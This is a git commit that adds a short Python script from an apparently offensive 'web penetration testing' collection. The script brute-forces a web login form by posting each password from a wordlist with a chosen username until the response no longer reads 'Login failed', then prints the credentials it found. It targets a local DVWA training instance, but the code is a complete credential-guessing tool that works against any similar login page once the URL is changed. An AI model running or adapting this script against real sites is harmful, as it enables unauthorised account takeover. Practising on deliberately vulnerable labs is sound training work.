6a0f3d171bf7621527e784df420268a71fccaba7
Warmonger <86009160+Malwareman007@users.noreply.github.com>
2022-07-26 22:46:45 +0530

    commit
    Signed-off-by: Warmonger <86009160+Malwareman007@users.noreply.github.com>

---
+++ WEB_Penetration_Testing/bruteforce.py
@@ -0,0 +1,26 @@
+#/usr/bin/python
+
+import requests
+from termcolor import colored
+
+def bruteforce(username, url):
+    for password in passwords:
+        password = password.strip('\n')
+        print(colored("Trying Password: %s" % password, "yellow"))
+        dataDict = {"username":username, "password":password, "Login":"submit"}
+        response = requests.post(url, data=dataDict)
+        if b"Login failed" in response.content:
+            pass
+        else:
+            print(colored("[+] Username --> " + username, "green"))
+            print(colored("[+] Password --> " + password, "green"))
+            exit()
+
+page_url = "http://127.0.0.1/dvwa/login.php"
+username = input("Enter Username For Specified Page: ")
+
+with open("passwordList.txt", "r") as passwords:
+    bruteforce(username, page_url)
+
+print(colored("[-] Password Not Found in List", "red"))
+
